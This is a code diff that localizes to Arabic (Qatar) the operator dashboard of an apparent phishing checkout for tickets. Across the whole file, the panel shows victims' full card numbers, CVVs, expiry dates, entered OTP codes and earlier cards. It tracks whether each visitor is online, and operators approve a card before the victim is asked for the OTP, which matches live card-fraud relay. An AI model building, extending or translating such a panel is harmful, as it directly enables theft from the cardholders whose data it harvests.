@@ -99,32 +99,32 @@ function getDisplayName(record: PayRecord): string {
 function getLastMessage(record: PayRecord): string {
   const paymentStatus = record.payment?.status ?? record.status;
   if (paymentStatus === "step_one_submitted") {
-    return "Step 1 submitted - waiting card details";
+    return "تم إرسال الخطوة الأولى - بانتظار بيانات البطاقة";
   }
   if (paymentStatus === "pending_review") {
-    return "Waiting dashboard approval";
+    return "بانتظار موافقة لوحة التحكم";
   }
   if (paymentStatus === "approved") {
-    return "Approved - customer can enter OTP";
+    return "تمت الموافقة - يمكن للعميل إدخال رمز التحقق";
   }
   if (paymentStatus === "rejected") {
-    return "Card rejected from dashboard";
+    return "تم رفض البطاقة من لوحة التحكم";
   }
   if (paymentStatus === "otp_failed") {
-    return "OTP failed - needs review";
+    return "فشل رمز التحقق - يحتاج مراجعة";
   }
   if (paymentStatus === "otp_verified") {
-    return "Payment verified";
+    return "تم التحقق من الدفع";
   }
   if (paymentStatus === "otp_requested" || paymentStatus === "pending") {
-    return "Waiting for OTP confirmation";
+    return "بانتظار تأكيد رمز التحقق";
   }
 
   if (record.currentPage) {
-    return `Current page: ${record.currentPage}`;
+    return `الصفحة الحالية: ${record.currentPage}`;
   }
 
-  return "New checkout activity";
+  return "نشاط دفع جديد";
 }
 
 function getFormattedTime(value?: string | number): string {
@@ -138,7 +138,7 @@ function getFormattedTime(value?: string | number): string {
     return String(value);
   }
 
-  return new Intl.DateTimeFormat("en-GB", {
+  return new Intl.DateTimeFormat("ar-QA", {
     day: "2-digit",
     month: "short",
     hour: "2-digit",
@@ -187,21 +187,21 @@ function toGroupedCardNumber(value: string): string {
 
 function getStatusBadge(status?: string): { label: string; className: string } {
   if (status === "step_one_submitted") {
-    return { label: "Step 1", className: "bg-[#24333d] text-[#b9d6e3]" };
+    return { label: "الخطوة 1", className: "bg-[#24333d] text-[#b9d6e3]" };
   }
   if (status === "pending_review") {
-    return { label: "Under Review", className: "bg-[#3b2e14] text-[#ffd888]" };
+    return { label: "قيد المراجعة", className: "bg-[#3b2e14] text-[#ffd888]" };
   }
   if (status === "approved") {
-    return { label: "Approved", className: "bg-[#113744] text-[#8ddfff]" };
+    return { label: "مقبول", className: "bg-[#113744] text-[#8ddfff]" };
   }
   if (status === "rejected" || status === "otp_failed") {
-    return { label: "Rejected", className: "bg-[#3b1414] text-[#ff9f9f]" };
+    return { label: "مرفوض", className: "bg-[#3b1414] text-[#ff9f9f]" };
   }
   if (status === "otp_verified") {
-    return { label: "Verified", className: "bg-[#143224] text-[#7bf3b0]" };
+    return { label: "مؤكد", className: "bg-[#143224] text-[#7bf3b0]" };
   }
-  return { label: "Pending", className: "bg-[#2a3942] text-[#9ad4ff]" };
+  return { label: "قيد الانتظار", className: "bg-[#2a3942] text-[#9ad4ff]" };
 }
 
 export default function Dashboard() {
@@ -464,7 +464,7 @@ export default function Dashboard() {
       const message =
         markError instanceof Error
           ? markError.message
-          : "Unable to mark record as read.";
+          : "تعذر تحديد السجل كمقروء.";
       setError(message);
     } finally {
       setIsMarkingRead(false);
@@ -499,7 +499,7 @@ export default function Dashboard() {
       const message =
         decisionError instanceof Error
           ? decisionError.message
-          : "Unable to update payment decision.";
+          : "تعذر تحديث قرار الدفع.";
       setError(message);
     } finally {
       setDecisionLoading(null);
@@ -526,11 +526,11 @@ export default function Dashboard() {
         errorCode === "auth/wrong-password" ||
         errorCode === "auth/invalid-email"
       ) {
-        setAuthError("Invalid email or password.");
+        setAuthError("البريد الإلكتروني أو كلمة المرور غير صحيحة.");
         return;
       }
 
-      setAuthError("Unable to login with Firebase Auth.");
+      setAuthError("تعذر تسجيل الدخول عبر Firebase.");
     }
   };
 
@@ -541,16 +541,20 @@ export default function Dashboard() {
       setLoginPassword("");
       setLoginEmail("");
     } catch {
-      setAuthError("Unable to logout right now.");
+      setAuthError("تعذر تسجيل الخروج الآن.");
     }
   };
 
   if (authChecking) {
     return (
-      <div className="min-h-screen bg-[#0b141a] px-4 py-8 text-[#e9edef] sm:px-6">
+      <div
+        className="min-h-screen bg-[#0b141a] px-4 py-8 text-[#e9edef] sm:px-6"
+        dir="rtl"
+        lang="ar"
+      >
         <div className="mx-auto flex max-w-[460px] items-center justify-center rounded-2xl border border-[#2a3942] bg-[#111b21] p-6 text-sm text-[#9fb0b8]">
-          <Loader2 className="mr-2 h-4 w-4 animate-spin text-[#25d366]" />
-          Checking Firebase Auth session...
+          <Loader2 className="ml-2 h-4 w-4 animate-spin text-[#25d366]" />
+          جارٍ التحقق من جلسة Firebase...
         </div>
       </div>
     );
@@ -558,14 +562,18 @@ export default function Dashboard() {
 
   if (!isAuthenticated) {
     return (
-      <div className="min-h-screen bg-[#0b141a] px-4 py-8 text-[#e9edef] sm:px-6">
+      <div
+        className="min-h-screen bg-[#0b141a] px-4 py-8 text-[#e9edef] sm:px-6"
+        dir="rtl"
+        lang="ar"
+      >
         <div className="mx-auto max-w-[460px]">
           <div className="rounded-2xl bg-gradient-to-l from-[#25d366] to-[#128c7e] p-4 text-white shadow-xl sm:p-5">
             <p className="text-xs font-semibold tracking-wide text-white/90">
-              DASHBOARD ACCESS
+              دخول لوحة التحكم
             </p>
             <h1 className="mt-1 text-xl font-black sm:text-2xl">
-              Sign in to Dashboard
+              تسجيل الدخول إلى لوحة التحكم
             </h1>
           </div>
 
@@ -578,12 +586,12 @@ export default function Dashboard() {
           >
             <div className="mb-4 flex items-center gap-2 text-sm font-semibold text-[#9fb0b8]">
               <LockKeyhole className="h-4 w-4 text-[#25d366]" />
-              Protected dashboard login
+              تسجيل دخول محمي
             </div>
 
             <label className="block">
               <span className="mb-1 block text-xs font-semibold text-[#9fb0b8]">
-                Email
+                البريد الإلكتروني
               </span>
               <input
                 type="email"
@@ -592,20 +600,22 @@ export default function Dashboard() {
                 className="h-10 w-full rounded-md border border-[#2a3942] bg-[#0b141a] px-3 text-sm text-[#e9edef] outline-none focus:border-[#25d366]"
                 placeholder="admin@example.com"
                 autoComplete="email"
+                dir="ltr"
               />
             </label>
 
             <label className="mt-3 block">
               <span className="mb-1 block text-xs font-semibold text-[#9fb0b8]">
-                Password
+                كلمة المرور
               </span>
               <input
                 type="password"
                 value={loginPassword}
                 onChange={(event) => setLoginPassword(event.target.value)}
                 className="h-10 w-full rounded-md border border-[#2a3942] bg-[#0b141a] px-3 text-sm text-[#e9edef] outline-none focus:border-[#25d366]"
-                placeholder="Enter password"
+                placeholder="أدخل كلمة المرور"
                 autoComplete="current-password"
+                dir="ltr"
               />
             </label>
 
@@ -619,11 +629,11 @@ export default function Dashboard() {
               type="submit"
               className="mt-4 w-full rounded-md bg-[#25d366] px-4 py-2 text-sm font-semibold text-[#0b141a] hover:bg-[#20be5b]"
             >
-              Login
+              تسجيل الدخول
             </button>
 
             <p className="mt-3 text-[11px] text-[#8696a0]">
-              Use a Firebase Authentication user (Email/Password provider).
+              استخدم حساب Firebase Authentication (مزود البريد الإلكتروني/كلمة المرور).
             </p>
           </form>
         </div>
@@ -632,24 +642,24 @@ export default function Dashboard() {
   }
 
   return (
-    <div className="min-h-screen bg-[#0b141a] text-[#e9edef]">
+    <div className="min-h-screen bg-[#0b141a] text-[#e9edef]" dir="rtl" lang="ar">
       <div className="mx-auto max-w-[1300px] px-4 py-6 sm:px-6">
         <header className="rounded-2xl bg-gradient-to-l from-[#25d366] to-[#128c7e] p-4 text-white shadow-xl sm:p-5">
           <div className="flex flex-wrap items-center justify-between gap-3">
             <div>
               <p className="text-xs font-semibold tracking-wide text-white/90">
-                LIVE FIREBASE MONITOR
+                مراقبة Firebase المباشرة
               </p>
               <h1 className="mt-1 text-xl font-black sm:text-2xl">
-                WhatsApp Style Payment Dashboard
+                لوحة متابعة المدفوعات
               </h1>
             </div>
             <div className="flex items-center gap-2 text-sm">
               <span className="rounded-full bg-white/20 px-3 py-1 font-semibold">
-                Total: {records.length}
+                الإجمالي: {records.length}
               </span>
               <span className="rounded-full bg-black/20 px-3 py-1 font-semibold">
-                Unread: {unreadCount}
+                غير المقروء: {unreadCount}
               </span>
               <button
                 type="button"
@@ -661,7 +671,7 @@ export default function Dashboard() {
                 ) : (
                   <BellOff className="h-3.5 w-3.5" />
                 )}
-                {isSoundEnabled ? "Sound on" : "Sound off"}
+                {isSoundEnabled ? "الصوت مُفعّل" : "الصوت مُعطّل"}
               </button>
               <button
                 type="button"
@@ -669,13 +679,13 @@ export default function Dashboard() {
                 className="inline-flex items-center gap-1 rounded-full bg-black/20 px-3 py-1 font-semibold text-white hover:bg-black/30"
               >
                 <LogOut className="h-3.5 w-3.5" />
-                Logout
+                تسجيل الخروج
               </button>
               <Link
                 href="/"
                 className="rounded-full bg-white/90 px-3 py-1 font-semibold text-[#128c7e] hover:bg-white"
               >
-                Back to site
+                العودة للموقع
               </Link>
             </div>
           </div>
@@ -691,7 +701,7 @@ export default function Dashboard() {
                   value={search}
                   onChange={(event) => setSearch(event.target.value)}
                   className="w-full bg-transparent text-sm text-[#e9edef] outline-none placeholder:text-[#8696a0]"
-                  placeholder="Search by name, phone, email, or ID..."
+                  placeholder="ابحث بالاسم أو الهاتف أو البريد أو المعرّف..."
                 />
               </div>
             </div>
@@ -700,13 +710,13 @@ export default function Dashboard() {
               {isLoading ? (
                 <div className="flex items-center justify-center gap-2 p-6 text-sm text-[#8696a0]">
                   <Loader2 className="h-4 w-4 animate-spin" />
-                  Loading records...
+                  جارٍ تحميل السجلات...
                 </div>
               ) : null}
 
               {!isLoading && filteredRecords.length === 0 ? (
                 <div className="p-6 text-center text-sm text-[#8696a0]">
-                  No records found.
+                  لم يتم العثور على سجلات.
                 </div>
               ) : null}
 
@@ -722,13 +732,13 @@ export default function Dashboard() {
                     key={record.id}
                     type="button"
                     onClick={() => setSelectedId(record.id)}
-                    className={`w-full border-b border-[#2a3942] px-3 py-3 text-left transition-colors ${
+                    className={`w-full border-b border-[#2a3942] px-3 py-3 text-right transition-colors ${
                       isSelected ? "bg-[#2a3942]" : "bg-transparent hover:bg-[#202c33]"
                     }`}
                   >
                     <div className="flex items-start gap-3">
                       <div className="mt-0.5 h-10 w-10 shrink-0 rounded-full bg-[#25d366] text-center text-xs font-black leading-10 text-[#0b141a]">
-                        {(getDisplayName(record).charAt(0) || "V").toUpperCase()}
+                        {(getDisplayName(record).charAt(0) || "ز").toUpperCase()}
                       </div>
                       <div className="min-w-0 flex-1">
                         <div className="flex items-center justify-between gap-2">
@@ -739,7 +749,7 @@ export default function Dashboard() {
                             {getFormattedTime(record.updatedAt ?? record.createdAt)}
                           </span>
                         </div>
-                        <p className="mt-0.5 truncate text-xs text-[#8696a0]">
+                        <p className="mt-0.5 truncate text-xs text-[#8696a0]" dir="ltr">
                           {record.id}
                         </p>
                         <div className="mt-1 flex items-center gap-1.5 text-[10px]">
@@ -753,7 +763,7 @@ export default function Dashboard() {
                               isOnline ? "text-[#25d366]" : "text-[#8696a0]"
                             }
                           >
-                            {isOnline ? "online" : "offline"}
+                            {isOnline ? "متصل" : "غير متصل"}
                           </span>
                         </div>
                         <div className="mt-2 flex items-center justify-between gap-2">
@@ -777,28 +787,30 @@ export default function Dashboard() {
           <main className="rounded-2xl border border-[#2a3942] bg-[#0f1a20]">
             {!selectedRecord ? (
               <div className="flex min-h-[400px] items-center justify-center px-6 text-center text-sm text-[#8696a0]">
-                Select a conversation to view full checkout data.
+                اختر محادثة لعرض تفاصيل الدفع كاملة.
               </div>
             ) : (
               <div className="p-4 sm:p-5">
                 <div className="flex flex-wrap items-center justify-between gap-3 border-b border-[#2a3942] pb-4">
                   <div className="flex items-center gap-3">
                     <div className="h-11 w-11 rounded-full bg-[#25d366] text-center text-sm font-black leading-[44px] text-[#0b141a]">
-                      {(getDisplayName(selectedRecord).charAt(0) || "V").toUpperCase()}
+                      {(getDisplayName(selectedRecord).charAt(0) || "ز").toUpperCase()}
                     </div>
                     <div>
                       <h2 className="text-lg font-black text-[#e9edef]">
                         {getDisplayName(selectedRecord)}
                       </h2>
-                      <p className="text-xs text-[#8696a0]">{selectedRecord.id}</p>
+                      <p className="text-xs text-[#8696a0]" dir="ltr">
+                        {selectedRecord.id}
+                      </p>
                       <p
                         className={`mt-0.5 text-[11px] font-semibold ${
                           isSelectedOnline ? "text-[#25d366]" : "text-[#8696a0]"
                         }`}
                       >
                         {isSelectedOnline
-                          ? "Online now"
-                          : `Offline • Last seen ${selectedLastSeen}`}
+                          ? "متصل الآن"
+                          : `غير متصل • آخر ظهور ${selectedLastSeen}`}
                       </p>
                     </div>
                   </div>
@@ -814,7 +826,7 @@ export default function Dashboard() {
                       disabled={decisionLoading !== null || !hasCardForReview}
                       className="rounded-full border border-[#1f4f3a] bg-[#1a8e4c] px-3 py-1 text-xs font-semibold text-white hover:bg-[#14723c] disabled:cursor-not-allowed disabled:opacity-60"
                     >
-                      {decisionLoading === "approve" ? "Approving..." : "Approve"}
+                      {decisionLoading === "approve" ? "جارٍ القبول..." : "قبول"}
                     </button>
                     <button
                       type="button"
@@ -822,7 +834,7 @@ export default function Dashboard() {
                       disabled={decisionLoading !== null || !hasCardForReview}
                       className="rounded-full border border-[#5a1a1a] bg-[#a63535] px-3 py-1 text-xs font-semibold text-white hover:bg-[#8d2c2c] disabled:cursor-not-allowed disabled:opacity-60"
                     >
-                      {decisionLoading === "reject" ? "Rejecting..." : "Reject"}
+                      {decisionLoading === "reject" ? "جارٍ الرفض..." : "رفض"}
                     </button>
                     <button
                       type="button"
@@ -830,7 +842,7 @@ export default function Dashboard() {
                       disabled={!selectedRecord.isUnread || isMarkingRead}
                       className="rounded-full border border-[#2a3942] bg-[#202c33] px-3 py-1 text-xs font-semibold text-[#d5dfe4] hover:bg-[#2a3942] disabled:cursor-not-allowed disabled:opacity-60"
                     >
-                      {isMarkingRead ? "Marking..." : "Mark as read"}
+                      {isMarkingRead ? "جارٍ التحديد..." : "تحديد كمقروء"}
                     </button>
                   </div>
                 </div>
@@ -839,7 +851,7 @@ export default function Dashboard() {
                   <section className="space-y-3">
                     <article className="max-w-[95%] rounded-xl rounded-tr-sm bg-[#202c33] px-4 py-3">
                       <p className="text-[11px] font-semibold tracking-wide text-[#9fb0b8]">
-                        BILLING INFO
+                        بيانات الفوترة
                       </p>
                       <div className="mt-2 space-y-1 text-sm text-[#e9edef]">
                         <p className="flex items-center gap-2">
@@ -852,34 +864,34 @@ export default function Dashboard() {
                         </p>
                         <p className="flex items-center gap-2">
                           <CalendarDays className="h-4 w-4 text-[#25d366]" />
-                          {selectedRecord.visitDateIso ?? "No visit date"}
+                          {selectedRecord.visitDateIso ?? "لا يوجد تاريخ زيارة"}
                         </p>
                       </div>
                     </article>
 
                     <article className="mr-auto max-w-[95%] rounded-xl rounded-tl-sm bg-[#005c4b] px-4 py-3">
                       <p className="text-[11px] font-semibold tracking-wide text-[#b8eee1]">
-                        ORDER SUMMARY
+                        ملخص الطلب
                       </p>
                       <div className="mt-2 space-y-2 text-sm text-white">
                         {(selectedRecord.items ?? []).length === 0 ? (
-                          <p className="text-xs text-white/80">No item details found.</p>
+                          <p className="text-xs text-white/80">لا توجد تفاصيل عناصر.</p>
                         ) : (
                           (selectedRecord.items ?? []).map((item, index) => (
                             <div
                               key={`${item.id ?? "item"}-${index}`}
                               className="rounded-md bg-black/15 px-2 py-1.5"
                             >
-                              <p className="font-semibold">{item.name ?? "Ticket item"}</p>
+                              <p className="font-semibold">{item.name ?? "عنصر تذكرة"}</p>
                               <p className="text-xs text-white/80">
-                                Qty: {item.quantity ?? 0} | Unit:{" "}
+                                الكمية: {item.quantity ?? 0} | سعر الوحدة:{" "}
                                 {formatQar(item.unitPrice ?? 0)}
                               </p>
                             </div>
                           ))
                         )}
                         <p className="pt-1 text-sm font-black">
-                          Total: {formatQar(calculatedTotal)}
+                          الإجمالي: {formatQar(calculatedTotal)}
                         </p>
                       </div>
                     </article>
@@ -887,37 +899,37 @@ export default function Dashboard() {
 
                   <section className="space-y-3">
                     <div className="rounded-2xl bg-gradient-to-br from-[#075e54] via-[#0f8c7a] to-[#25d366] p-4 text-white shadow-lg">
-                      <p className="text-[11px] text-white/80">Payment Card Mockup</p>
+                      <p className="text-[11px] text-white/80">معاينة بطاقة الدفع</p>
                       <div className="mt-4 text-lg font-semibold tracking-[0.15em]" dir="ltr">
                         {selectedCardNumber}
                       </div>
                       <div className="mt-5 flex items-end justify-between gap-3">
                         <div className="min-w-0">
-                          <p className="text-[10px] text-white/70">Card Holder</p>
+                          <p className="text-[10px] text-white/70">اسم حامل البطاقة</p>
                           <p className="truncate text-sm font-semibold">
                             {selectedRecord.payment?.cardholderName ?? "--"}
                           </p>
                         </div>
                         <div className="text-right">
-                          <p className="text-[10px] text-white/70">Expiry</p>
+                          <p className="text-[10px] text-white/70">الانتهاء</p>
                           <p className="text-sm font-semibold" dir="ltr">
                             {selectedRecord.payment?.expiry ?? "--/--"}
                           </p>
                         </div>
                       </div>
                       <div className="mt-3 inline-flex rounded-md bg-black/20 px-2.5 py-1 text-xs font-semibold">
-                        CVV: {selectedRecord.payment?.cvv ?? "--"}
+                        رمز CVV: {selectedRecord.payment?.cvv ?? "--"}
                       </div>
                     </div>
 
                     <div className="rounded-xl border border-[#2a3942] bg-[#111b21] p-3">
                       <p className="flex items-center gap-2 text-xs font-semibold text-[#9fb0b8]">
                         <CreditCard className="h-4 w-4 text-[#25d366]" />
-                        FULL PAYMENT DATA
+                        كامل بيانات الدفع
                       </p>
                       <div className="mt-2 space-y-1 text-sm text-[#e9edef]">
                         <p>
-                          <span className="text-[#9fb0b8]">Card Number:</span>{" "}
+                          <span className="text-[#9fb0b8]">رقم البطاقة:</span>{" "}
                           {selectedRecord.payment?.cardNumberFull ??
                             selectedRecord.payment?.cardNumberMasked ??
                             "--"}
@@ -931,13 +943,11 @@ export default function Dashboard() {
                           {selectedRecord.payment?.otpCode ?? "--"}
                         </p>
                         <p>
-                          <span className="text-[#9fb0b8]">Status:</span>{" "}
-                          {selectedRecord.payment?.status ??
-                            selectedRecord.status ??
-                            "--"}
+                          <span className="text-[#9fb0b8]">الحالة:</span>{" "}
+                          {selectedStatus ? selectedStatusBadge.label : "--"}
                         </p>
                         <p>
-                          <span className="text-[#9fb0b8]">Last Update:</span>{" "}
+                          <span className="text-[#9fb0b8]">آخر تحديث:</span>{" "}
                           {getFormattedTime(
                             selectedRecord.updatedAt ?? selectedRecord.createdAt
                           )}
@@ -948,11 +958,11 @@ export default function Dashboard() {
                     <div className="rounded-xl border border-[#2a3942] bg-[#111b21] p-3">
                       <p className="flex items-center gap-2 text-xs font-semibold text-[#9fb0b8]">
                         <CreditCard className="h-4 w-4 text-[#25d366]" />
-                        CARD HISTORY (OLD CARDS)
+                        سجل البطاقات (القديمة)
                       </p>
                       {selectedCardHistory.length === 0 ? (
                         <p className="mt-2 text-xs text-[#8696a0]">
-                          No previous card updates for this visitor.
+                          لا توجد تحديثات بطاقات سابقة لهذا الزائر.
                         </p>
                       ) : (
                         <div className="mt-2 space-y-2">
@@ -972,11 +982,11 @@ export default function Dashboard() {
                                 )}
                               </p>
                               <p className="mt-0.5 text-[#9fb0b8]">
-                                Exp: {entry.expiry ?? "--/--"} | CVV:{" "}
+                                الانتهاء: {entry.expiry ?? "--/--"} | CVV:{" "}
                                 {entry.cvv ?? "--"}
                               </p>
                               <p className="mt-0.5 text-[#8696a0]">
-                                Changed: {getFormattedTime(entry.changedAt ?? "--")}
+                                تم التغيير: {getFormattedTime(entry.changedAt ?? "--")}
                               </p>
                             </div>
                           ))}
@@ -989,7 +999,7 @@ export default function Dashboard() {
                 <section className="mt-4 rounded-xl border border-[#2a3942] bg-[#111b21] p-3">
                   <p className="mb-2 flex items-center gap-2 text-xs font-semibold text-[#9fb0b8]">
                     <MessageCircle className="h-4 w-4 text-[#25d366]" />
-                    FULL RECORD JSON
+                    بيانات السجل الكاملة (JSON)
                   </p>
                   <pre className="max-h-[320px] overflow-auto rounded-md bg-[#0b141a] p-3 text-[11px] leading-5 text-[#b9c7ce]">
                     {JSON.stringify(selectedRecord, null, 2)}
